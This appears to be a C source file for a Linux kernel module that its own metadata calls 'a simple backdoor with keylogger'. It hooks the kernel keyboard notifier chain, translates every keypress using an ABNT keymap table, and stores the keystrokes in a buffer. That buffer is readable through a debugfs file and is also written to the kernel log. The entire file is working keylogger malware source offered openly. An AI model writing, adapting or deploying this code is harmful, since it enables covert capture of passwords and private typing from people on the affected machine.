/**
 * @file backdoor.c
 * @author your name (you@domain.com)
 * @brief 
 * @ref https://0x00sec.org/t/linux-keylogger-and-notification-chains/4566
 * https://docs.kernel.org/input/notifier.html
 * @version 0.1
 * @date 2023-06-24
 * 
 * @copyright Copyright (c) 2023
 * 
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/debugfs.h>
#include <linux/stat.h>
#include <linux/keyboard.h>
#include <linux/input.h>

#define CHUNK_LEN  12 /* Encoded 'keycode shift' chunk length */
#define BUFFER_LEN (PAGE_SIZE << 2) 

/*
 * Keymap references:
 * https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
 * http://www.quadibloc.com/comp/scan.htm
 * http://kbdlayout.info/KBDBR/virtualkeys+scancodes?arrangement=ABNT
 */
static const char *dictionary[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
	{"o", "O"}, {"p", "P"}, {"'", "`"}, {"[", "{"},                 // 24-27
	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {"ç", "Ç"},                 // 36-39
	{"~", "^"}, {"'", "\""}, {"_LSHIFT_", "_LSHIFT_"}, {"]", "}"},  // 40-43
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
	{".", ">"}, {";", ":"}, {"_RSHIFT_", "_RSHIFT_"}, {"*", "*"},   // 52-55
	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},// 56-59
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70 
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
	{"_KPD._", "_DEL_"}, {"_PRT_SC_", "_PRT_SC_"}, {"\0", "\0"},    // 83-85
	{"\\", "|"}, {"F11", "F11"}, {"F12", "F12"}, {"/", "?"},		// 86-89
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, // 90-94
	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"}, //95-98
	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
	{"_PAUSE_", "_PAUSE_"},
};

// Declarations 
/**
 * @brief struct dentry is used in the Linux kernel to represent directory entries. It is defined in the Linux kernel source code and is part of the Virtual File System (VFS) layer. The struct dentry structure contains information about a particular directory entry, including its name, inode (index node) pointer, and various other attributes
 */
static struct dentry *file;
static struct dentry *subdir;

static size_t buf_pos;
static char keys_buf[BUFFER_LEN];

static int keypress_callback(struct notifier_block *notifier, unsigned long action, void *data);
static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset);


/**
 * @brief notifier_call is given by my function
 * 
 */
static struct notifier_block alarm_block = {
	.notifier_call = keypress_callback, // configure the callback function 
};

/**
 * @brief change the way that the kernel will manage the file
 * 
 */
const struct file_operations keys_fops = {
	.owner = THIS_MODULE,
	.read = keys_read,
};

/**
 * @brief copy data from the buffer to user space
 * 
 * @param filp file
 * @param buffer the user user space to read to
 * @param len maximum number of bytes in buffer
 * @param offset current position in buffer
 * @return ssize_t the status of the read
 */
static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset) {
	// when offset is over, copy to file
	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
}

/**
 * @brief convert keycode to string
 * given the dictionary created, each keycode is dictionary's index
 * acccess the dictionary in given index to find the correspond key
 * @param keycode key pressed 
 * @param shift_is_pressed if shift is pressed
 * @param buffer storage the key translated
 */
void keycode_to_string(int keycode, int shift_is_pressed, char *buffer){
	if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE){
		const char *key_translated = (shift_is_pressed == 1)
			? dictionary[keycode][1]
			: dictionary[keycode][0];
		snprintf(buffer, CHUNK_LEN, "%s", key_translated);
	}
}

/**
 * @see https://docs.kernel.org/input/notifier.html
 * @see https://0x00sec.org/t/linux-keylogger-and-notification-chains/4566
 * @brief called when a keypress event occurs. it's a callback function
 * @param notifier it's the block itself 
 * @param action a value indicating the type of event occurred.
 * @param data a pointer that can be used to pass extra information about the event occurred. the Keyboard Notification Chain uses this pointer to pass all data related to the KEY pressed
 * @return NOTIFY_OK indicate the status or result of a notification operation. it means successful 
 */
int keypress_callback(struct notifier_block *notifier, unsigned long action, void *data){
	char key_buffer[CHUNK_LEN] = {0}; // it will storage the translated keycode 
	size_t len;
	struct keyboard_notifier_param *param = data;

	// EXIT IF KEY IS NOT PRESSED
	if (param->down != 0x1)
		return NOTIFY_OK;
	
	// CONVERT KEYCODE TO READABLE
	keycode_to_string(param->value, param->shift, key_buffer);

	len = strlen(key_buffer);
	if (len < 1) // unmapped
		return NOTIFY_OK;

	// OVERSIZED BUFFER => RESETS
	if ((buf_pos + len) >= BUFFER_LEN)
		buf_pos = 0;
	printk(KERN_INFO "keys_buffer = %s\n", keys_buf);

	// STRING KEY TO BUFFER
	strncpy(keys_buf + buf_pos, key_buffer, len);
	buf_pos += len;

	return NOTIFY_OK;
}

/**
 * @brief module entry point
 *  creates debufs directory and file to log keys
 * register notified structure @notifier_block
 * @return 0 on successful, ohterwise return a message error
 */
static int __init backdoor_init(void){    
    printk(KERN_INFO "[+] Backdoor Initialized\n");

    // SUBDIR CONFIGURATIONS
    subdir = debugfs_create_dir("backdoor", NULL);
	if (IS_ERR(subdir)){
		printk(KERN_INFO "[-] Error in create directory\n");
		return PTR_ERR(subdir);
	}
	if (!subdir){
		printk(KERN_INFO "[-] No such file or directory\n");
		return -ENOENT;
	}

	// FILE CONFIGURATIONS
	file = debugfs_create_file("keylogger", 0400, subdir, NULL, &keys_fops);
	if (!file) {
		printk(KERN_INFO "[-] Error in create file - the directory will me removed\n");
		debugfs_remove_recursive(subdir);
		return -ENOENT;
	}

	// KEYBOARD EVENT
	/**
	 * @brief Construct a new register keyboard notifier object that will call the function keypress_callback when a keypress event occurs
	 */
	register_keyboard_notifier(&alarm_block);

    return 0;
}

/**
 * @brief when the module stop, this function will be activated
 * unregister the notification keybaord block 
 * clean debufs directory
 */
static void __exit backdoor_exit(void){
    printk(KERN_INFO "[-] Backdoor Finished\n");
	unregister_keyboard_notifier(&alarm_block);
    debugfs_remove_recursive(subdir);
}

module_init(backdoor_init);
module_exit(backdoor_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Michel Hecker Faria");
MODULE_AUTHOR("Vitor Nishimura Vian");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("A simple backdoor with keylogger to debugfs");
